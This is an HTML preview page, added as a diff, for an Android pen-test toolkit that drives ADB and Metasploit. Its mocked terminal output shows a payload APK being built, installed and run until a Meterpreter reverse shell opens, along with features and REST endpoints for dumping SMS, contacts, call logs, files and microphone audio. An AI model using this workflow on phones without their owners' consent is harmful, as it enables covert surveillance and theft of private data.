@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Android-Crack — UI Preview</title>
+<style>
+  :root {
+    --bg:        #0b0f1a;
+    --bg2:       #131826;
+    --bg3:       #1a2030;
+    --border:    #2a3245;
+    --text:      #e6e8f0;
+    --muted:     #6f7a96;
+    --brand:     #e879f9;   /* magenta */
+    --accent:    #22d3ee;   /* cyan */
+    --ok:        #4ade80;
+    --warn:      #fbbf24;
+    --err:       #f87171;
+    --yellow:    #facc15;
+  }
+  * { box-sizing: border-box; }
+  html, body {
+    margin: 0; padding: 0;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.55;
+  }
+  .mono { font-family: 'JetBrains Mono', 'SF Mono', Menlo, Consolas, monospace; }
+
+  /* Layout */
+  header {
+    padding: 56px 32px 32px;
+    text-align: center;
+    background: radial-gradient(ellipse at top, rgba(232,121,249,0.12), transparent 60%),
+                radial-gradient(ellipse at bottom, rgba(34,211,238,0.08), transparent 60%);
+    border-bottom: 1px solid var(--border);
+  }
+  header h1 {
+    font-size: 56px; margin: 0 0 8px;
+    background: linear-gradient(135deg, var(--brand), var(--accent));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    letter-spacing: -1px;
+  }
+  header p { color: var(--muted); margin: 4px 0; }
+  header .badges { margin-top: 20px; }
+  .badge {
+    display: inline-block;
+    padding: 4px 12px;
+    margin: 0 4px;
+    border-radius: 999px;
+    font-size: 13px;
+    font-weight: 600;
+    background: rgba(255,255,255,0.06);
+    border: 1px solid var(--border);
+  }
+  .badge.brand   { color: var(--brand); border-color: rgba(232,121,249,0.4); }
+  .badge.accent  { color: var(--accent); border-color: rgba(34,211,238,0.4); }
+  .badge.ok      { color: var(--ok); border-color: rgba(74,222,128,0.4); }
+
+  nav {
+    position: sticky; top: 0; z-index: 5;
+    background: rgba(11,15,26,0.92);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    padding: 12px 32px;
+    text-align: center;
+  }
+  nav a {
+    color: var(--muted);
+    text-decoration: none;
+    margin: 0 14px;
+    font-size: 14px;
+    font-weight: 500;
+    transition: color 0.15s;
+  }
+  nav a:hover { color: var(--brand); }
+
+  main { max-width: 1100px; margin: 0 auto; padding: 48px 32px; }
+  section { margin-bottom: 72px; }
+  section h2 {
+    font-size: 28px;
+    margin: 0 0 8px;
+    color: var(--brand);
+  }
+  section .desc { color: var(--muted); margin-bottom: 24px; }
+
+  /* Terminal mockups */
+  .term {
+    background: #07090f;
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.4), 0 0 0 1px rgba(232,121,249,0.06);
+    margin-bottom: 24px;
+  }
+  .term-bar {
+    background: linear-gradient(180deg, #1a2030, #131826);
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .term-bar .dot {
+    width: 12px; height: 12px; border-radius: 50%;
+  }
+  .term-bar .red    { background: #ff5f57; }
+  .term-bar .yellow { background: #febc2e; }
+  .term-bar .green  { background: #28c840; }
+  .term-bar .title {
+    margin-left: 12px;
+    color: var(--muted);
+    font-size: 12px;
+    font-family: 'JetBrains Mono', Menlo, monospace;
+  }
+  .term-body {
+    padding: 18px 22px;
+    font-family: 'JetBrains Mono', 'SF Mono', Menlo, Consolas, monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    color: var(--text);
+    white-space: pre;
+    overflow-x: auto;
+  }
+
+  /* Rich-style tokens */
+  .brand  { color: var(--brand); font-weight: 700; }
+  .accent { color: var(--accent); font-weight: 700; }
+  .ok     { color: var(--ok); }
+  .warn   { color: var(--warn); }
+  .err    { color: var(--err); }
+  .muted  { color: var(--muted); }
+  .kbd {
+    background: rgba(255,255,255,0.08);
+    border-radius: 4px;
+    padding: 1px 6px;
+    font-size: 12px;
+    color: var(--text);
+  }
+
+  /* Rich Panel mock */
+  .panel {
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 12px 16px;
+    margin: 8px 0;
+  }
+  .panel.brand { border-color: var(--brand); }
+  .panel.accent { border-color: var(--accent); }
+  .panel.warn { border-color: var(--warn); }
+  .panel-title {
+    color: inherit;
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+
+  /* Table mock — Rich style */
+  .rich-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 8px 0;
+    font-size: 13px;
+  }
+  .rich-table caption {
+    color: var(--accent);
+    font-weight: 700;
+    text-align: left;
+    padding: 4px 0;
+  }
+  .rich-table th {
+    color: var(--accent);
+    text-align: left;
+    padding: 6px 12px;
+    border-bottom: 1px solid var(--border);
+    font-weight: 700;
+  }
+  .rich-table td {
+    padding: 4px 12px;
+  }
+  .rich-table td.brand { color: var(--brand); }
+  .rich-table td.ok    { color: var(--ok); }
+  .rich-table td.num   { color: var(--muted); text-align: right; }
+
+  /* TUI mockup */
+  .tui {
+    background: #07090f;
+    border: 2px solid var(--brand);
+    border-radius: 8px;
+    height: 460px;
+    display: grid;
+    grid-template-rows: 32px 1fr 32px;
+    font-family: 'JetBrains Mono', Menlo, monospace;
+    font-size: 13px;
+  }
+  .tui-header {
+    background: var(--brand);
+    color: #07090f;
+    padding: 6px 14px;
+    font-weight: 700;
+    display: flex;
+    justify-content: space-between;
+  }
+  .tui-body { display: grid; grid-template-rows: 40% 60%; }
+  .tui-table {
+    border-bottom: 1px solid var(--border);
+    padding: 8px 14px;
+    overflow: auto;
+  }
+  .tui-log {
+    padding: 8px 14px;
+    overflow: auto;
+    color: var(--text);
+  }
+  .tui-footer {
+    background: #131826;
+    color: var(--muted);
+    padding: 6px 14px;
+    font-size: 12px;
+    display: flex;
+    gap: 18px;
+    border-top: 1px solid var(--border);
+  }
+  .tui-footer span b { color: var(--accent); }
+
+  /* Cards grid */
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 16px;
+  }
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 18px 20px;
+    transition: border-color 0.2s, transform 0.2s;
+  }
+  .card:hover { border-color: var(--brand); transform: translateY(-2px); }
+  .card h3 {
+    margin: 0 0 8px;
+    color: var(--accent);
+    font-size: 15px;
+    font-family: 'JetBrains Mono', Menlo, monospace;
+  }
+  .card p { margin: 0; font-size: 13px; color: var(--muted); }
+
+  /* REST endpoint list */
+  .endpoint {
+    display: grid;
+    grid-template-columns: 80px 1fr;
+    gap: 14px;
+    align-items: center;
+    padding: 10px 14px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin-bottom: 8px;
+    font-family: 'JetBrains Mono', Menlo, monospace;
+    font-size: 13px;
+  }
+  .method {
+    text-align: center;
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-weight: 700;
+    font-size: 11px;
+  }
+  .method.get  { background: rgba(34,211,238,0.15); color: var(--accent); }
+  .method.post { background: rgba(74,222,128,0.15); color: var(--ok); }
+
+  footer {
+    text-align: center;
+    padding: 40px;
+    color: var(--muted);
+    font-size: 13px;
+    border-top: 1px solid var(--border);
+  }
+  footer a { color: var(--accent); text-decoration: none; }
+
+  /* ASCII art */
+  .ascii {
+    font-family: 'JetBrains Mono', Menlo, monospace;
+    color: var(--brand);
+    text-align: center;
+    font-size: 13px;
+    line-height: 1.2;
+    margin: 16px 0;
+    white-space: pre;
+    overflow-x: auto;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Android-Crack</h1>
+  <p>Android pen-test toolkit over ADB + Metasploit-Framework</p>
+  <p class="mono"><span class="muted">v0.9.0  ·  authorized testing only  ·  GPL-3.0</span></p>
+  <div class="badges">
+    <span class="badge brand">Python 3.10+</span>
+    <span class="badge accent">async</span>
+    <span class="badge ok">Kali primary</span>
+    <span class="badge">CLI + TUI + REST</span>
+    <span class="badge">multi-device</span>
+  </div>
+</header>
+
+<nav>
+  <a href="#banner">Banner</a>
+  <a href="#cli">CLI</a>
+  <a href="#exploit">Exploit Flow</a>
+  <a href="#tui">TUI</a>
+  <a href="#cluster">Cluster</a>
+  <a href="#audit">Audit Log</a>
+  <a href="#rest">REST API</a>
+  <a href="#capabilities">Capabilities</a>
+</nav>
+
+<main>
+
+<!-- BANNER ============================================================ -->
+<section id="banner">
+  <h2>Startup Banner</h2>
+  <div class="desc">Shown when running <span class="mono">android-crack</span> with no subcommand.</div>
+
+  <div class="term">
+    <div class="term-bar">
+      <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+      <span class="title">yash@kali ~ — android-crack</span>
+    </div>
+    <div class="term-body"><div class="panel brand"><div class="ascii">   ___           __           _     __   ______                __
+  / _ |  ___ _  / / _ _____  (_)___/ /  / ____/______ _  ___  / /__
+ / __ | / _ `/ /_/_// __/ // / __  /  / /__  / __/ _ `/ / __/ /  '_/
+/_/ |_| \_,_/   /_/ /_/  \_, /\_,_/   \____/_/  \_,_/ /__/ /_/\_\
+                        /___/</div><span class="brand">Android-Crack </span><span class="accent">v0.9.0</span><span class="muted">  ·  </span><span class="accent">ADB + Metasploit toolkit</span><span class="muted">  ·  </span><span class="ok">by Yash Koladiya</span></div>
+
+<div class="panel warn"><div class="panel-title warn">Disclaimer</div>Authorized testing only. Use on devices you own or for
+engagements with written scope. You are responsible for
+compliance with all applicable laws.
+
+Confirm with: <span class="kbd">android-crack --i-have-authorization</span></div></div>
+  </div>
+</section>
+
+<!-- CLI =============================================================== -->
+<section id="cli">
+  <h2>CLI — Devices &amp; Info</h2>
+  <div class="desc">Rich-themed tables with bold magenta headers and green status.</div>
+
+  <div class="term">
+    <div class="term-bar">
+      <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+      <span class="title">android-crack devices</span>
+    </div>
+    <div class="term-body"><span class="muted">$ </span>android-crack devices
+
+<table class="rich-table"><caption>ADB devices</caption>
+<tr><th>#</th><th>Serial</th><th>State</th><th>Model</th><th>Product</th></tr>
+<tr><td class="num">1</td><td class="brand">192.168.1.42:5555</td><td class="ok">device</td><td class="accent">Pixel 7</td><td class="muted">cheetah</td></tr>
+<tr><td class="num">2</td><td class="brand">RZ8N20XYZAB</td><td class="ok">device</td><td class="accent">SM-S918B</td><td class="muted">dm3q</td></tr>
+<tr><td class="num">3</td><td class="brand">emulator-5554</td><td class="warn">unauthorized</td><td>—</td><td>—</td></tr>
+</table></div>
+  </div>
+
+  <div class="term">
+    <div class="term-bar">
+      <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+      <span class="title">android-crack info --serial 192.168.1.42:5555</span>
+    </div>
+    <div class="term-body"><span class="muted">$ </span>android-crack info --serial 192.168.1.42:5555
+
+<table class="rich-table"><caption>Device 192.168.1.42:5555</caption>
+<tr><th>Property</th><th>Value</th></tr>
+<tr><td class="brand">Model</td><td class="ok">Pixel 7</td></tr>
+<tr><td class="brand">Manufacturer</td><td class="ok">Google</td></tr>
+<tr><td class="brand">Android Version</td><td class="ok">14</td></tr>
+<tr><td class="brand">Sdk</td><td class="ok">34</td></tr>
+<tr><td class="brand">Security Patch</td><td class="ok">2025-04-05</td></tr>
+<tr><td class="brand">Build Date</td><td class="ok">Fri Apr 12 18:22:01 UTC 2025</td></tr>
+<tr><td class="brand">Encryption</td><td class="ok">encrypted</td></tr>
+<tr><td class="brand">Sim Operator</td><td class="ok">Airtel</td></tr>
+</table></div>
+  </div>
+</section>
+
+<!-- EXPLOIT =========================================================== -->
+<section id="exploit">
+  <h2>Exploit Flow — Defensive Defaults</h2>
+  <div class="desc">Disclaimer panel always shown. <span class="mono">--disable-verifier</span> opt-in, restored on exit.</div>
+
+  <div class="term">
+    <div class="term-bar">
+      <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+      <span class="title">android-crack exploit run --lhost 192.168.1.10</span>
+    </div>
+    <div class="term-body"><span class="muted">$ </span>android-crack exploit run --lhost 192.168.1.10
+
+<div class="panel warn"><div class="panel-title warn">exploit run</div><span class="warn">Authorized testing only.</span> About to:
+  · msfvenom build  →  <span class="accent">payload.apk</span>
+  · adb install -r on <span class="brand">192.168.1.42:5555</span>
+  · monkey-launch com.metasploit.stage
+  · msfconsole handler on <span class="accent">192.168.1.10:4444</span></div>
+Continue? [y/N]: <span class="ok">y</span>
+<span class="muted">⠙ msfvenom: building APK…</span>
+<span class="ok">Payload built:</span> payload.apk
+<span class="muted">⠙ adb install payload…</span>
+<span class="ok">Payload installed.</span>
+<span class="muted">⠙ Launching payload…</span>
+<span class="ok">Payload launched.</span>
+<span class="brand">Starting handler.</span> Use Ctrl-C inside msfconsole to exit.
+
+[*] Started reverse TCP handler on 192.168.1.10:4444
+[*] Sending stage (78809 bytes) to 192.168.1.42
+[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.42:46220)
+
+meterpreter > <span class="brand">_</span></div>
+  </div>
+</section>
+
+<!-- TUI =============================================================== -->
+<section id="tui">
+  <h2>Textual TUI</h2>
+  <div class="desc">Keyboard-driven device dashboard. Press <span class="kbd">r</span> refresh, <span class="kbd">i</span> info, <span class="kbd">p</span> screenshot, <span class="kbd">q</span> quit.</div>
+
+  <div class="tui">
+    <div class="tui-header">
+      <span>Android-Crack</span>
+      <span class="muted">Authorized testing only</span>
+      <span class="mono">16:42</span>
+    </div>
+    <div class="tui-body">
+      <div class="tui-table">
+        <div style="color:var(--accent); font-weight:700; border-bottom: 1px solid var(--border); padding-bottom: 4px; margin-bottom: 6px;">
+          <span style="display:inline-block; width:32%;">Serial</span>
+          <span style="display:inline-block; width:18%;">State</span>
+          <span style="display:inline-block; width:25%;">Model</span>
+          <span style="display:inline-block; width:25%;">Product</span>
+        </div>
+        <div style="background: rgba(34,211,238,0.15); padding: 4px 0;">
+          <span style="display:inline-block; width:32%; color: var(--brand);">192.168.1.42:5555</span>
+          <span style="display:inline-block; width:18%; color: var(--ok);">device</span>
+          <span style="display:inline-block; width:25%;">Pixel 7</span>
+          <span style="display:inline-block; width:25%; color: var(--muted);">cheetah</span>
+        </div>
+        <div style="padding: 4px 0;">
+          <span style="display:inline-block; width:32%; color: var(--brand);">RZ8N20XYZAB</span>
+          <span style="display:inline-block; width:18%; color: var(--ok);">device</span>
+          <span style="display:inline-block; width:25%;">SM-S918B</span>
+          <span style="display:inline-block; width:25%; color: var(--muted);">dm3q</span>
+        </div>
+        <div style="padding: 4px 0;">
+          <span style="display:inline-block; width:32%; color: var(--brand);">emulator-5554</span>
+          <span style="display:inline-block; width:18%; color: var(--warn);">unauthorized</span>
+          <span style="display:inline-block; width:25%; color: var(--muted);">—</span>
+          <span style="display:inline-block; width:25%; color: var(--muted);">—</span>
+        </div>
+      </div>
+      <div class="tui-log">
+        <div style="color: var(--muted);">Refreshing devices…</div>
+        <div style="color: var(--ok); font-weight: 700;">3 device(s)</div>
+        <div style="color: var(--brand); font-weight: 700;">192.168.1.42:5555<span style="color: var(--text); font-weight: 400;">  Google Pixel 7  Android 14  SDK 34  patch 2025-04-05</span></div>
+        <div style="color: var(--ok); font-weight: 700;">Saved: <span style="color: var(--text); font-weight: 400;">~/.local/share/android-crack/captures/screenshot-192_168_1_42_5555-20260520-164210.png</span></div>
+      </div>
+    </div>
+    <div class="tui-footer">
+      <span><b>r</b> Refresh</span>
+      <span><b>i</b> Info</span>
+      <span><b>p</b> Screenshot</span>
+      <span><b>q</b> Quit</span>
+    </div>
+  </div>
+</section>
+
+<!-- CLUSTER =========================================================== -->
+<section id="cluster">
+  <h2>Cluster — Parallel Across Devices</h2>
+  <div class="desc">Fan out a single capability across every ready device.</div>
+
+  <div class="term">
+    <div class="term-bar">
+      <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+      <span class="title">android-crack cluster info --all</span>
+    </div>
+    <div class="term-body"><span class="muted">$ </span>android-crack cluster info --all
+
+<table class="rich-table"><caption>Cluster info (3 device(s))</caption>
+<tr><th>Serial</th><th>Model</th><th>Android</th><th>SDK</th><th>Security patch</th></tr>
+<tr><td class="brand">192.168.1.42:5555</td><td class="ok">Google Pixel 7</td><td class="accent">14</td><td class="muted">34</td><td class="muted">2025-04-05</td></tr>
+<tr><td class="brand">RZ8N20XYZAB</td><td class="ok">Samsung SM-S918B</td><td class="accent">14</td><td class="muted">34</td><td class="muted">2025-03-01</td></tr>
+<tr><td class="brand">emulator-5556</td><td class="ok">Google sdk_gphone64_arm64</td><td class="accent">15</td><td class="muted">35</td><td class="muted">2025-04-05</td></tr>
+</table></div>
+  </div>
+</section>
+
+<!-- AUDIT ============================================================= -->
+<section id="audit">
+  <h2>Audit Log</h2>
+  <div class="desc">SQLite event store. Operator, host, capability, duration, exit code, stdout sha256.</div>
+
+  <div class="term">
+    <div class="term-bar">
+      <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+      <span class="title">android-crack audit tail -n 6</span>
+    </div>
+    <div class="term-body"><span class="muted">$ </span>android-crack audit tail -n 6
+
+<table class="rich-table"><caption>Audit (last 6)</caption>
+<tr><th>id</th><th>when</th><th>operator@host</th><th>capability</th><th>serial</th><th>rc</th><th>ms</th></tr>
+<tr><td class="num">142</td><td class="muted">2026-05-20 16:42:11</td><td class="brand">yash@kali</td><td class="ok">api.media.screenshot</td><td class="accent">192.168.1.42:5555</td><td>0</td><td>421</td></tr>
+<tr><td class="num">141</td><td class="muted">2026-05-20 16:41:58</td><td class="brand">yash@kali</td><td class="ok">api.devices.info</td><td class="accent">192.168.1.42:5555</td><td>0</td><td>89</td></tr>
+<tr><td class="num">140</td><td class="muted">2026-05-20 16:41:55</td><td class="brand">yash@kali</td><td class="ok">api.devices.list</td><td class="accent">—</td><td>0</td><td>32</td></tr>
+<tr><td class="num">139</td><td class="muted">2026-05-20 16:40:02</td><td class="brand">yash@kali</td><td class="ok">api.diag.root</td><td class="accent">RZ8N20XYZAB</td><td>0</td><td>612</td></tr>
+<tr><td class="num">138</td><td class="muted">2026-05-20 16:39:48</td><td class="brand">yash@kali</td><td class="err">api.export.sms</td><td class="accent">RZ8N20XYZAB</td><td>1</td><td>184</td></tr>
+<tr><td class="num">137</td><td class="muted">2026-05-20 16:38:21</td><td class="brand">yash@kali</td><td class="ok">api.apps.list</td><td class="accent">192.168.1.42:5555</td><td>0</td><td>156</td></tr>
+</table></div>
+  </div>
+</section>
+
+<!-- REST API ========================================================== -->
+<section id="rest">
+  <h2>REST API</h2>
+  <div class="desc">FastAPI behind <span class="mono">android-crack serve</span>. Every call lands in the audit log.</div>
+
+  <div class="endpoint"><span class="method get">GET</span><span><span class="accent">/health</span> <span class="muted">— liveness probe</span></span></div>
+  <div class="endpoint"><span class="method get">GET</span><span><span class="accent">/devices</span> <span class="muted">— list ADB devices</span></span></div>
+  <div class="endpoint"><span class="method get">GET</span><span><span class="accent">/devices/{serial}/info</span> <span class="muted">— model / Android version / SDK / SoC</span></span></div>
+  <div class="endpoint"><span class="method get">GET</span><span><span class="accent">/devices/{serial}/battery</span> <span class="muted">— dumpsys battery</span></span></div>
+  <div class="endpoint"><span class="method get">GET</span><span><span class="accent">/devices/{serial}/apps?kind=third_party</span> <span class="muted">— package list</span></span></div>
+  <div class="endpoint"><span class="method post">POST</span><span><span class="accent">/devices/{serial}/screenshot</span> <span class="muted">— capture + pull</span></span></div>
+  <div class="endpoint"><span class="method get">GET</span><span><span class="accent">/devices/{serial}/wifi/saved</span> <span class="muted">— saved SSIDs (no passwords)</span></span></div>
+  <div class="endpoint"><span class="method get">GET</span><span><span class="accent">/devices/{serial}/root</span> <span class="muted">— root / Magisk heuristics</span></span></div>
+  <div class="endpoint"><span class="method post">POST</span><span><span class="accent">/devices/{serial}/exports/sms</span> <span class="muted">— dump SMS</span></span></div>
+  <div class="endpoint"><span class="method post">POST</span><span><span class="accent">/devices/{serial}/exports/contacts</span> <span class="muted">— dump contacts</span></span></div>
+  <div class="endpoint"><span class="method post">POST</span><span><span class="accent">/devices/{serial}/exports/calls</span> <span class="muted">— dump call log</span></span></div>
+  <div class="endpoint"><span class="method get">GET</span><span><span class="accent">/audit/tail?limit=N</span> <span class="muted">— recent audit events</span></span></div>
+</section>
+
+<!-- CAPABILITIES ====================================================== -->
+<section id="capabilities">
+  <h2>Capability Surface</h2>
+  <div class="desc">~70 commands grouped by domain.</div>
+
+  <div class="grid">
+    <div class="card"><h3>connect</h3><p>tcp + Android 11 pair + disconnect + LAN scan</p></div>
+    <div class="card"><h3>shell</h3><p>interactive + one-shot, keycodes + text input</p></div>
+    <div class="card"><h3>apps</h3><p>list, install (+ split), uninstall, launch, force-stop, clear, restart, perm grant/revoke, extract APK</p></div>
+    <div class="card"><h3>files</h3><p>ls / pull / push + bucket pulls (WhatsApp, Camera, Screenshots, Downloads, Music, Movies)</p></div>
+    <div class="card"><h3>export</h3><p>SMS, contacts, call log, logcat</p></div>
+    <div class="card"><h3>media</h3><p>screenshot, screen-record, scrcpy mirror, mic / device audio stream + record</p></div>
+    <div class="card"><h3>comms</h3><p>send SMS, open URL on device</p></div>
+    <div class="card"><h3>keycodes</h3><p>interactive REPL: 19 named codes + arbitrary keycode + text input</p></div>
+    <div class="card"><h3>network</h3><p>ip / route / DNS, ping, forward / reverse, LAN scan</p></div>
+    <div class="card"><h3>wifi</h3><p>status, ip, enable / disable, saved SSIDs (no passwords)</p></div>
+    <div class="card"><h3>diag</h3><p>battery, locale, root heuristics, dev-settings, stay-on</p></div>
+    <div class="card"><h3>exploit</h3><p>msfvenom payload + msfconsole handler + opt-in verifier toggle</p></div>
+    <div class="card"><h3>cluster</h3><p>parallel info / screenshot / shell across N devices</p></div>
+    <div class="card"><h3>audit</h3><p>SQLite trail of every command</p></div>
+    <div class="card"><h3>tui</h3><p>Textual app with device table + log pane</p></div>
+    <div class="card"><h3>serve</h3><p>FastAPI REST mode for automation</p></div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <p><strong>Android-Crack</strong> · GPL-3.0-or-later · ©&nbsp;2026 Yash Koladiya</p>
+  <p>
+    <a href="https://github.com/Yash-Koladiya30/Android-Crack">GitHub</a>
+    &nbsp;·&nbsp;
+    <a href="../docs/authorization.md">Authorization</a>
+    &nbsp;·&nbsp;
+    <a href="../docs/plugin-api.md">Plugin API</a>
+    &nbsp;·&nbsp;
+    <a href="../docs/architecture.md">Architecture</a>
+  </p>
+  <p class="muted">This page is a static UI preview. Run <code>android-crack tui</code> for the live interface.</p>
+</footer>
+
+</body>
+</html>
